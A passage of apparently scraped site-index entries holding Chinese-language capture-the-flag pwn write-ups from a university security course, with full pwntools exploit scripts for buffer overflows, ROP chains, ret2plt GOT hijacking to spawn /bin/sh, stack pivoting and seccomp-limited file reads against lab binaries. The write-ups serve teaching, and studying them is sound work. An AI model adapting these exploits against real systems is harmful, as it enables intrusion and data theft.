\u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; char flag[0x10]; long secret; char empty_buf[0x30]; void check(char *input) { char pass[0x10]; char output[0x10]; for (int i = 0; i \u0026lt; 2; ++i) { ((long *)pass)[i] = ((long *)input)[i] ^ secret; } if (strcmp(pass, \u0026#34;kyoumokawaii\u0026#34;) == 0) { for (int i = 0; i \u0026lt; 2; ++i) ((long *)output)[i] = ((long *)flag)[i] ^ ((long *)pass)[i]; } printf(\u0026#34;flag = %s\\n\u0026#34;, output); } int main(void) { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); int fd = 0; char buf[0x10]; fd = open(\u0026#34;/home/chal/flag.txt\u0026#34;, O_RDONLY); read(fd, flag, 0x10); close(fd); fd = open(\u0026#34;/dev/urandom\u0026#34;, O_RDONLY); read(fd, \u0026amp;secret, sizeof(secret)); for (int i = 0; i \u0026lt; 2; ++i) ((long *)flag)[i] = ((long *)flag)[i] ^ secret; printf(\u0026#34;secret = %lx\\n\u0026#34;, secret); printf(\u0026#34;\u0026gt; \u0026#34;); gets(buf); return 0; } :::\nRecon # 先看這個程式的行為，在main當中，他會打開flag.txt和urandom這兩個file，然後做兩者的XOR，並且回傳urandom的內容給我們，並且有BOF的漏洞存在 :::info flag和secret這兩個變數都是global variable ::: 而check這個function的功能是我們可以輸入一個input，他會和secret做XOR，若結果等於==kyoumokawaii==就把前面加密過的flag再跟kyoumokawaii做XOR並回傳給我們\n思路很簡單: 雖然整隻程式都沒有呼叫到check function，但如果我們拿到secret，又可以進到check，是否可以做一些操作拿到flag 一開始一定會做的事情是把flag加密 $$ cipher= flag \\oplus secret\\ $$ 如果可以進到check function $$ input\\leftarrow kyoumokawaii\\oplus secret $$ $$ output\\leftarrow cipher\\oplus kyoumokawaii=flag\\oplus secret\\oplus kyoumokawaii $$ $$ flag = output\\oplus secret\\oplus kyoumokawaii $$ 此時output, secret都已知，我們反推出flag為何，但重點是要怎麼呼叫到check function?==ROP chain + BOF==\n先利用該隻binary的gadget蓋成我們需要的chain，並且隨便找一個區間是不太會寫入的bss section address check_fn_addr = 0x4017ba bss_section = 0x4c7f00 pop_rdx_rbx_ret = 0x0000000000485e8b mov_qword_ptr_rdi_rdx_ret = 0x00000000004337e3 pop_rdi_ret = 0x00000000004020af ... rop_chain = flat( pop_rdi_ret, bss_section, pop_rdx_rbx_ret, input_1, 0, mov_qword_ptr_rdi_rdx_ret, pop_rdi_ret, bss_section + 0x8, pop_rdx_rbx_ret, input_2, 0, mov_qword_ptr_rdi_rdx_ret, pop_rdi_ret, bss_section, check_fn_addr ) 等到跳到check function後就可以開始接return output，並按照上面的公式回推flag Exploit - ROP + BOF # from pwn import * from Crypto.Util.number import bytes_to_long, long_to_bytes # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10051) context.arch = \u0026#39;amd64\u0026#39; r.recvuntil(b\u0026#39;secret = \u0026#39;) secret = int(r.recvline().strip().decode(), 16) log.info(f\u0026#39;secret = {hex(secret)}\u0026#39;) check_fn_addr = 0x4017ba bss_section = 0x4c7f00 pop_rdx_rbx_ret = 0x0000000000485e8b mov_qword_ptr_rdi_rdx_ret = 0x00000000004337e3 pop_rdi_ret = 0x00000000004020af input_1 = u64(b\u0026#39;kyoumoka\u0026#39;) ^ secret input_2 = u64(b\u0026#39;waii\\x00\\x00\\x00\\x00\u0026#39;) ^ secret log.info(f\u0026#39;input_1 = {hex(input_1)}, input_2 = {hex(input_2)}\u0026#39;) rop_chain = flat( pop_rdi_ret, bss_section, pop_rdx_rbx_ret, input_1, 0, mov_qword_ptr_rdi_rdx_ret, pop_rdi_ret, bss_section + 0x8, pop_rdx_rbx_ret, input_2, 0, mov_qword_ptr_rdi_rdx_ret, pop_rdi_ret, bss_section, check_fn_addr ) # raw_input() r.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;a\u0026#39; * 40 + rop_chain) r.recvuntil(b\u0026#39;flag = \u0026#39;) output = r.recvline().strip() log.info(f\u0026#39;output = {output}\u0026#39;) log.info(f\u0026#39;Part 1 = {hex(u64(output[0:8]))}, Part 2 = {hex(u64(output[8:16]))}\u0026#39;) flag_1 = p64(u64(output[0:8]) ^ input_1) flag_2 = p64(u64(output[8:16]) ^ input_2) log.info(f\u0026#39;flag = {(flag_1 + flag_2).strip().decode()}\u0026#39;) r.interactive() "},{"id":395,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/","title":"Simple PWN 0x34 (2023 Lab - ret2plt)","section":"Securities","content":" Simple PWN 0x34 (2023 Lab - ret2plt) # Background # Got Hijack / BoF\nSource code # //gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(){ char buf[20]; setvbuf(stdout,0,2,0); printf(\u0026#34;Try your best :\u0026#34;); gets(buf); puts(\u0026#34;boom !\u0026#34;);\t} Recon # checksec + file $ checksec chal [*] \u0026#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f7ed984819a3908eff455bfcf87716d0fb298fac, for GNU/Linux 3.2.0, not stripped 首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去 還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看 流程: 首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt== pop rdi ret puts got address puts plt 這三行的意思是把puts的got address，透過puts印出來給我們 -\u0026gt; puts(put自己的got address) 有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address # leak puts got address to calculate libc base address puts_addr = u64(r.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) libc_base = puts_addr - libc.symbols[\u0026#39;puts\u0026#39;] libc.address = libc_base system_addr = libc.symbols[\u0026#39;system\u0026#39;] 現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有/bin/sh或是/sh的string，不過我們可以直接用同樣的方法，把字串送進去 # fetch user input -\u0026gt; /bin/sh\\x00 pop_rdi_ret bss_addr gets_plt, 此時他就會像使用者要輸入，並把我們的輸入丟到bss address 另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking== # fetch user input -\u0026gt; system address pop_rdi_ret puts_got gets_plt 此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address 所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system # system(\u0026#39;/bin/sh\\x00\u0026#39;) pop_rdi_ret bss_addr puts_plt Exploit - Ret2Plt(leak base address) + Got Hijack(call system) # from pwn import * r = process(\u0026#39;./chal\u0026#39;) # r = remote(\u0026#39;10.113.184.121\u0026#39;, 10053) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) context.arch = \u0026#39;amd64\u0026#39; pop_rdi_ret = 0x0000000000401263 puts_got = 0x403368 puts_plt = 0x401070 gets_got = 0x403378 gets_plt = 0x401090 bss_addr = 0x403f00 payload = flat( # leak puts got address to calculate libc base address pop_rdi_ret, puts_got, puts_plt, # fetch user input -\u0026gt; /bin/sh\\x00 pop_rdi_ret, bss_addr, gets_plt, # fetch user input -\u0026gt; system address pop_rdi_ret, puts_got, gets_plt, # system(\u0026#39;/bin/sh\\x00\u0026#39;) pop_rdi_ret, bss_addr, puts_plt ) raw_input() r.sendlineafter(b\u0026#39;Try your best :\u0026#39;, b\u0026#39;a\u0026#39; * 0x28 + payload) print(r.recvline()) puts_addr = u64(r.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) log.info(f\u0026#34;puts address = {hex(puts_addr)}\u0026#34;) libc_base = puts_addr - libc.symbols[\u0026#39;puts\u0026#39;] libc.address = libc_base system_addr = libc.symbols[\u0026#39;system\u0026#39;] log.info(f\u0026#39;system address = {hex(system_addr)}\u0026#39;) r.sendline(b\u0026#39;/bin/sh\\x00\u0026#39;) raw_input() r.sendline(p64(libc.symbols[\u0026#39;system\u0026#39;])) r.interactive() "},{"id":396,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/","title":"Simple PWN 0x35(2023 Lab - Stack Pivot)","section":"Securities","content":" Simple PWN 0x35(2023 Lab - Stack Pivot) # Background # Simple PWN - 0x09(stack pivoting) Simple PWN - 0x10(seccomp/Lab - rop2win)\nSource code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(void) { char buf[0x20]; read(0, buf, 0x80); return 0; } Recon # 這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall\nchecksec + file $ checksec chal [*] \u0026#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=26fa8e6daa97baf7a26596ea91af5703dd932327, for GNU/Linux 3.2.0, not stripped 首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫 找gadget leave_ret = 0x0000000000401cfc pop_rdi_ret = 0x0000000000401832 pop_rsi_ret = 0x000000000040f01e pop_rax_ret = 0x0000000000448d27 pop_rdx_ret = 0x000000000040173f syscall_ret = 0x0000000000448280 這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來 gef➤ x/10i 0x448280 0x448280 \u0026lt;read+16\u0026gt;: syscall =\u0026gt; 0x448282 \u0026lt;read+18\u0026gt;: cmp rax,0xfffffffffffff000 0x448288 \u0026lt;read+24\u0026gt;: ja 0x4482e0 \u0026lt;read+112\u0026gt; 0x44828a \u0026lt;read+26\u0026gt;: ret 會這樣的原因是我們在ROPgadget中找不到syscall ; ret的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop Construct ROP 首先，我們的流程是 ==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write== 會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload 寫入的bss_addr和main_fn address bss_addr_open = 0x4c2700 bss_addr_read = 0x4c2800 bss_addr_write = 0x4c2900 main_fn = 0x401ce1 先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload trash_payload = b\u0026#39;a\u0026#39;*0x20 r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn)) 之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到0x4c2700，然後ret address接main_fn 用gdb跟一下，放完的結果大概是這樣 0x00007ffc884f3670│+0x0000: \u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34; ← $rsp, $rsi 0x00007ffc884f3678│+0x0008: \u0026#34;aaaaaaaaaaaaaaaaaaaaaaaa\u0026#34; 0x00007ffc884f3680│+0x0010: \u0026#34;aaaaaaaaaaaaaaaa\u0026#34; 0x00007ffc884f3688│+0x0018: \u0026#34;aaaaaaaa\u0026#34; 0x00007ffc884f3690│+0x0020: 0x00000000004c2700 → \u0026lt;transmem_list+0\u0026gt; add BYTE PTR [rax], al ← $rbp 0x00007ffc884f3698│+0x0028: 0x0000000000401ce1 → \u0026lt;main+12\u0026gt; lea rax, [rbp-0x20] 當main_fn執行完leave(mov rsp , rbp ; pop rbp ;)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700 觀察main_fn的assembly gef➤ x/10i \u0026amp;main 0x401cd5 \u0026lt;main\u0026gt;: endbr64 0x401cd9 \u0026lt;main+4\u0026gt;: push rbp 0x401cda \u0026lt;main+5\u0026gt;: mov rbp,rsp 0x401cdd \u0026lt;main+8\u0026gt;: sub rsp,0x20 0x401ce1 \u0026lt;main+12\u0026gt;: lea rax,[rbp-0x20] 0x401ce5 \u0026lt;main+16\u0026gt;: mov edx,0x80 0x401cea \u0026lt;main+21\u0026gt;: mov rsi,rax 0x401ced \u0026lt;main+24\u0026gt;: mov edi,0x0 0x401cf2 \u0026lt;main+29\u0026gt;: call 0x448270 \u0026lt;read\u0026gt; 0x401cf7 \u0026lt;main+34\u0026gt;: mov eax,0x0 從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來 寫入bss_addr_open 我們的目標是達成==fd = open(\u0026quot;/home/chal/flag.txt\u0026quot;, 0);==，具體payload如下 file_addr = b\u0026#39;/home/chal/flag.txt\u0026#39;.ljust(0x20, b\u0026#39;\\x00\u0026#39;) ROP_open = flat( # Open file # fd = open(\u0026#34;/home/chal/flag.txt\u0026#34;, 0); bss_addr_read, pop_rax_ret, 2, pop_rdi_ret, bss_addr_open - 0x20, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret, main_fn ) r.sendline(file_addr + ROP_open) 首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方 寫入bss_addr_read 我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下 ROP_read = flat( # Read the file # read(fd, buf, 0x30); bss_addr_write, pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, main_fn ) r.sendline(file_addr + ROP_read) 寫入bss_addr_write 我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下 ROP_write = flat( # Write the file # write(1, buf, 0x30); bss_addr_write, pop_rax_ret, 1, pop_rdi_ret, 1, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, 0 ) r.sendline(file_addr + ROP_write) :::danger 執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行\n$ docker-compose up -d $ docker ps $ docker exec -it {container name} /bin/bash \u0026gt; apt update; apt upgrade -y; apt install curl binutils vim git gdb python3 python3-pip -y \u0026gt; pip install pwntools -y \u0026gt; python3 exp.py :::\nExploit - ROPchain + stack pivot # from pwn import * context.arch = \u0026#39;amd64\u0026#39; # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10054) leave_ret = 0x0000000000401cfc pop_rdi_ret = 0x0000000000401832 pop_rsi_ret = 0x000000000040f01e pop_rax_ret = 0x0000000000448d27 pop_rdx_ret = 0x000000000040173f syscall_ret = 0x0000000000448280 bss_addr_open = 0x4c2700 bss_addr_read = 0x4c2800 bss_addr_write = 0x4c2900 main_fn = 0x401ce1 # raw_input() # Modify RBP to a new Stack Space trash_payload = b\u0026#39;a\u0026#39;*0x20 r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn)) # Open /home/chal/flag.txt file_addr = b\u0026#39;/home/chal/flag.txt\u0026#39;.ljust(0x20, b\u0026#39;\\x00\u0026#39;) ROP_open = flat( # Open file # fd = open(\u0026#34;/home/chal/flag.txt\u0026#34;, 0); bss_addr_read, pop_rax_ret, 2, pop_rdi_ret, bss_addr_open - 0x20, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret, main_fn ) # raw_input() r.sendline(file_addr + ROP_open) # Read flag.txt ROP_read = flat( # Read the file # read(fd, buf, 0x30); bss_addr_write, pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, main_fn ) # raw_input() r.sendline(file_addr + ROP_read) # Write flat.txt to stdout ROP_write = flat( # Write the file # write(1, buf, 0x30); bss_addr_write, pop_rax_ret, 1, pop_rdi_ret, 1, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, 0 ) # raw_input() r.sendline(file_addr + ROP_write) r.interactive() "},{"id":397,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/","title":"Simple PWN 0x36(2023 HW - Notepad-Stage 3)","section":"Securities","content":" Simple PWN 0x36(2023 HW - Notepad-Stage 3) # Source code # 呈上上題\nRecon # 這一題沒時間解出來，所以僅僅做個紀錄，包含和各位大老討論的結果以及流程\n首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address 知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣 "},{"id":398,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/","title":"Simple PWN 0x37(2023 HW - HACHAMA)","section":"Securities","content":" Simple PWN 0x37(2023 HW - HACHAMA) # Background # stack pivot rop bof\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026#34;SECCOMP.h\u0026#34; long n; char msg[0x20]; long n2; struct sock_filter seccompfilter[]={ BPF_STMT(BPF_LD | BPF_W | BPF_ABS, ArchField), BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), BPF_STMT(BPF_LD | BPF_W | BPF_ABS, SyscallNum), Allow(open), Allow(openat), Allow(read), Allow(write), Allow(close), Allow(readlink), Allow(getdents), Allow(getrandom), Allow(brk), Allow(rt_sigreturn), Allow(exit), Allow(exit_group), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), }; struct sock_fprog filterprog={ .len=sizeof(seccompfilter)/sizeof(struct sock_filter), .filter=seccompfilter }; void apply_seccomp(){ if(prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)){ perror(\u0026#34;Seccomp Error\u0026#34;); exit(1); } if(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,\u0026amp;filterprog)==-1){ perror(\u0026#34;Seccomp Error\u0026#34;); exit(1); } return; } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); apply_seccomp(); char buf2[0x30]; // long n2 = 0x30; // char msg[0x20]; char name[0x20]; // long n = 20; n2 = 0x30; n = 20; printf(\u0026#34;Haaton\u0026#39;s name? \u0026#34;); n = read(0, name, n); name[n] = 0; strcpy(msg, name); strcat(msg, \u0026#34; hachamachama\u0026#34;); puts(msg); puts(\u0026#34;ECHO HACHAMA!\u0026#34;); while (1) { read(0, buf2, n2); if (strcmp(buf2, \u0026#34;HACHAMA\u0026#34;) == 0) write(1, buf2, n2); else break; } return 0; } :::\nRecon # :::warning 切記題目用read接，所以不需要null byte做結尾，另外題目使用的libc是ubuntu 22.04.2的版本，所以可以用docker把libc資料撈出來，再針對這個做應用 ::: 這一題我覺得出的很好，有很特別的exploit，也需要用到很多前兩周學會的幾乎所有技能，包含BOF / return 2 libc / stack pivot / ROP等等\n==漏洞在哪裡???== 首先，乍看之下會不知道這個洞在哪裡，不過多try幾次或是跟一下動態會發現，他做的事情會蓋到原本==n2==的數值，導致我們之後可以輸入更多的東西 詳細來說就是: 因為在#61的地方輸入的東西被存到local variable name，而在#63會被copy到global variable ==msg==，並且和 hachamachama合併在一起，如果一開始我們輸入的東西是20個字元，而concatenate的 hachamachama總共13個字元，加起來就已經是==33==個字元，但如下圖所示，msg一開始的大小就被限制在32 bytes，也就是說他會蓋到後面n2的值 從下圖可以看出來，因為長度超過的關係，原本hachamachama的最後一個字元，也就是0x61往後蓋到n2的值，這代表我們在往後的地方可以多加利用 知道漏洞在哪裡之後，我們就可以利用這個洞，把stack的東西leak出來\npayload = b\u0026#39;HACHAMA\u0026#39;.ljust(0x8, b\u0026#39;\\x00\u0026#39;) r.send(payload) result = r.recv(0x61) log.info(\u0026#34;[-------------Stack Info-------------]\u0026#34;) for i in range(12): log.info(hex(u64(result[i * 8:i * 8 + 8]))) log.info(\u0026#34;[-------------Stack Info-------------]\u0026#34;) canary = u64(result[7 * 8:7 * 8 + 8]) libc_start_main = u64(result[9 * 8:9 * 8 + 8]) - 0x80 libc_base_addr = libc_start_main - 0x29d90 + 0x80 main_fn_addr = u64(result[11 * 8:11 * 8 + 8]) code_segment_base = main_fn_addr - 0x331 log.success(f\u0026#39;Canary = {hex(canary)}\u0026#39;) log.success(f\u0026#39;libc start main base = {hex(libc_start_main)}\u0026#39;) log.success(f\u0026#39;libc base addr = {hex(libc_base_addr)}\u0026#39;) log.success(f\u0026#39;Main Function Address = {hex(main_fn_addr)}\u0026#39;) log.success(f\u0026#39;Code Segment = {hex(code_segment_base)}\u0026#39;) 有了canary / libc base 和code segment base / main function address，就可以來搞事了，初步的想法是直接寫一個open / read / write的syscall(因為seccomp的關係導致我們的操作極其有限)，不過因為我們也只是多了0x31的空間可以寫ROP，代表一定沒辦法把所有的shellcode都寫上去，這時候就需要用到stack pivot的技術，開一個相對大的空間繼續我們的作業，但就像@ccccc說的\nstack pivot只是把你的stack用到其他地方而已，並不會因為你換了stack的位置你就能overflow比較多\n所以比較正確的觀念是，我先利用多出來的0x31把可以用的空間開大，再寫gadget，會比較方便，如果是像lab那樣每一個步驟都切成一個stack pivot的話也不現實，因為一個操作所需要的空間一定大於0x31，隨便舉個例子，如果是open→fd = open(\u0026quot;/home/chal/flag.txt\u0026quot;, 0);，全部的payload如下:\npayload = b\u0026#39;/home/chal/flag.txt\u0026#39;.ljust(0x38, b\u0026#39;\\x00\u0026#39;) payload += flat( canary, 0, pop_rax_ret, 2, pop_rdi_ret, bss_addr_flag - 0x40, pop_rdx_rbx_ret, 0, 0, pop_rsi_ret, 0, syscall_ret ) 最少也需要0x98的空間，所以擴大可以寫的空間是必要的，但我還是稍微嘮叨一下，一開始我的想法是直接把n2的數值改掉，這樣就可以解決上述的問題，但實際操作會發現這也不現實，因為payload也會過長，如下\npayload = b\u0026#39;a\u0026#39; * 0x38 payload += flat( canary, rbp, pop_rdi_ret, n2_addr, pop_rdx_ret, 0x200, mov_qword_ptr_rdi_rdx_ret, main_fn_addr + 291, ) 這樣最少也需要0x78的空間，比起最大值的0x61還差蠻多的，所以昨天就想了超久怎麼解決這個問題\n解決空間大小的問題 這個要回到動態實際執行的時候是怎麼呼叫的(如下圖)，這一題有趣的地方在這邊，理論上我們是回到main+291，讓他fetch n2的值給RAX，但如果我直接跳到main+298，並且利用rop把rax變大，是不是也有一樣的效果 extend_payload = flat( canary, bss_addr_flag, pop_rax_ret, 400, main_fn_addr + 298, ) 此時我們就不需要那麼多的gadget幫助完成該目標\n剩下的open / read / write就和lab差不多\n:::success 截至目前為止，我們的流程是\n設法利用overflow改變n2的數值，使我們能夠輸入更多shell code 先利用第一次的write輸入stack上的重要資訊 因為n2空間還是太小，所以我們需要先擴大能夠寫入的空間，也就是先利用第一次的stack pivot把shellcode寫上去→main+291 執行shellcode後，使rax變大再跳回去main+298 寫入真正的open / read / write讀出flag ::: :::warning 注意事項:\ncanary 因為他有開stack protection，所以一定要對好canary在stack上的位置，可以用動態去看，依照這一題的狀況，他是會在rbp+0x40的地方 libc version 這一題因為要leak libc的base address，並且利用ROP gadget達到syscall的目的，所以一定要確定remote server使用的版本是哪一個，光知道大的版本號是有可能會失敗的，因為像我local端到最後有成功，但跑在remote就爛掉了，和@david學長討論過後的結果就是libc version有問題，實際用docker去看彼此的差異就會發現，右邊是我的→22.04.3，而左邊是實際remote的docker開出來的結果→22.04.2，所以我的作法是把docker中的東西拉出來再使用，包含在local端使用以及找gadget $ docker cp /lib/x86_64-linux-gnu/libc.so.6 /mnt/d/Downloads/ IO problem 這個問題也是很弔詭，會發現我在最後一個send之前還有一個raw_input()，如果拿掉的話在remote一樣會爛掉，這有可能是IO之類的問題，但總之一定要加 ::: Exploit - BOF + Stack Pivot + ROP # from pwn import * r = process(\u0026#39;./chal\u0026#39;, env={\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;./libc.so.6\u0026#34;}) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10056) context.arch = \u0026#39;amd64\u0026#39; # Try to trigger length exploit payload = b\u0026#39;a\u0026#39; * 20 r.sendafter(b\u0026#34;Haaton\u0026#39;s name? \u0026#34;, payload) print(r.recvlines(2)) # Leak stack info payload = b\u0026#39;HACHAMA\u0026#39;.ljust(0x8, b\u0026#39;\\x00\u0026#39;) r.send(payload) result = r.recv(0x61) log.info(\u0026#34;[-------------Stack Info-------------]\u0026#34;) for i in range(12): log.info(hex(u64(result[i * 8:i * 8 + 8]))) log.info(\u0026#34;[-------------Stack Info-------------]\u0026#34;) canary = u64(result[7 * 8:7 * 8 + 8]) libc_start_main = u64(result[9 * 8:9 * 8 + 8]) - 0x80 libc_base_addr = libc_start_main - 0x29d90 + 0x80 main_fn_addr = u64(result[11 * 8:11 * 8 + 8]) code_segment_base = main_fn_addr - 0x331 log.success(f\u0026#39;Canary = {hex(canary)}\u0026#39;) log.success(f\u0026#39;libc start main base = {hex(libc_start_main)}\u0026#39;) log.success(f\u0026#39;libc base addr = {hex(libc_base_addr)}\u0026#39;) log.success(f\u0026#39;Main Function Address = {hex(main_fn_addr)}\u0026#39;) log.success(f\u0026#39;Code Segment = {hex(code_segment_base)}\u0026#39;) # Prepare ROP gadget pop_rax_ret = libc_base_addr + 0x0000000000045eb0# : pop rax ; ret pop_rdi_ret = libc_base_addr + 0x000000000002a3e5# : pop rdi ; ret pop_rsi_ret = libc_base_addr + 0x000000000002be51# : pop rsi ; ret pop_rdx_ret = libc_base_addr + 0x00000000000796a2# : pop rdx ; ret pop_rdx_rbx_ret = libc_base_addr + 0x0000000000090529# : pop rdx ; pop rbx ; ret syscall_ret = libc_base_addr + 0x0000000000091396# : syscall ; ret bss_addr = code_segment_base + 0x3000 + 0x200 bss_addr_flag = bss_addr + 0x400 bss_addr_buf = bss_addr_flag + 0x120 file_addr = b\u0026#39;/home/chal/flag.txt\u0026#39;.ljust(0x38, b\u0026#39;\\x00\u0026#39;) trash_payload = flat( canary, bss_addr, main_fn_addr + 291 ) extend_payload = flat( canary, bss_addr_flag, pop_rax_ret, 400, main_fn_addr + 298, ) open_payload = flat( # Open file # fd = open(\u0026#34;/home/chal/flag.txt\u0026#34;, 0); pop_rax_ret, 2, pop_rdi_ret, bss_addr_flag - 0x40, pop_rdx_rbx_ret, 0, 0, pop_rsi_ret, 0, syscall_ret ) read_payload = flat( # Read the file # read(fd, buf, 0x30); pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, bss_addr_buf, pop_rdx_rbx_ret, 0x70, 0, syscall_ret ) write_payload = flat( # Write the file # write(1, buf, 0x30); pop_rax_ret, 1, pop_rdi_ret, 1, # pop_rsi_ret, bss_addr_buf, # pop_rdx_ret, 0x70, syscall_ret ) # Extend rbp space r.send(b\u0026#39;a\u0026#39; * 0x38 + trash_payload) r.send(b\u0026#39;a\u0026#39; * 0x38 + extend_payload) # Write Exploit ROP gadget raw_input() r.send(file_addr + p64(canary) + p64(0) + open_payload + read_payload + write_payload) r.interactive() $ python exp.py [+] Starting local process \u0026#39;./chal\u0026#39;: pid 5857 [+] Opening connection to 10.113.184.121 on port 10056: Done [b\u0026#39;aaaaaaaaaaaaaaaaaaaa hachamachama\u0026#39;, b\u0026#39;ECHO HACHAMA!\u0026#39;] [*] [-------------Stack Info-------------] [*] 0x414d4148434148 [*] 0x0 [*] 0x0 [*] 0x0 [*] 0x0 [*] 0x0 [*] 0x0 [*] 0x2be6a8b7acfcbc00 [*] 0x1 [*] 0x7fef436ccd90 [*] 0x0 [*] 0x560ff1bf4331 [*] [-------------Stack Info-------------] [+] Canary = 0x2be6a8b7acfcbc00 [+] libc start main base = 0x7fef436ccd10 [+] libc base addr = 0x7fef436a3000 [+] Main Function Address = 0x560ff1bf4331 [+] Code Segment = 0x560ff1bf4000 [*] Switching to interactive mode flag{https://www.youtube.com/watch?v=qbEdlmzQftE\u0026amp;list=PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT\u0026amp;index=1} \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Segmentation fault [*] Got EOF while reading 